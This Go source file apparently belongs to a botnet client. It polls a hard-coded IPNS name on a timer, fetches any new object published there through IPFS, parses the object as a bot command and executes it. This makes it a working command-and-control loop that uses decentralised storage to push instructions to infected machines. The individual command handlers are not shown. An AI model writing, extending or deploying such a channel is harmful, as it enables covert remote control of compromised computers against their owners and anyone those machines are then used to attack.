package BotCommands

import (
	sh "github.com/ipfs/go-ipfs-api"
	"fmt"
	"time"
	"Constants"
)

func resolveIpns(shell *sh.Shell) (chan string, chan error) {
	ipfsAddressCh := make(chan string)
	errCh := make(chan error)

	go func() {
		ipfsAddress, err := shell.Resolve(Constants.IPNS_NAME)

		if err != nil {
			errCh <- err
		} else {
			ipfsAddressCh <- ipfsAddress
		}
	}()

	return ipfsAddressCh, errCh
}

func FetchCommand(ticker *time.Ticker, shell *sh.Shell) {
	lastAddress := ""

	for range ticker.C {
		fmt.Println("[fetch command] starting new ticker")

		fmt.Println("[fetch command] resolving ipfs name")
		ipfsAddressCh, errCh := resolveIpns(shell)

		select {
		case ipfsAddress := <-ipfsAddressCh:
			fmt.Println("[fetch command] name resolved")

			if lastAddress == ipfsAddress {
				fmt.Println("[fetch command] without new command")

			} else {
				fmt.Println("[fetch command] we have new command")

				lastAddress = ipfsAddress

				obj, err := shell.ObjectGet(ipfsAddress)
				check(err)

				fmt.Println("[fetch command] new raw command: ", obj.Data)

				botCommand, err := ParseBotCommand(obj.Data)
				check(err)

				botCommand.RunCommand()
			}

		case err := <-errCh:
			fmt.Println("[fetch command] error: ", err)

		case <-time.After(time.Second * 30):
			fmt.Println("[fetch command] timeout")
		}
	}
}

func check(e error) {
	if e != nil {
		panic(e)
	}
}
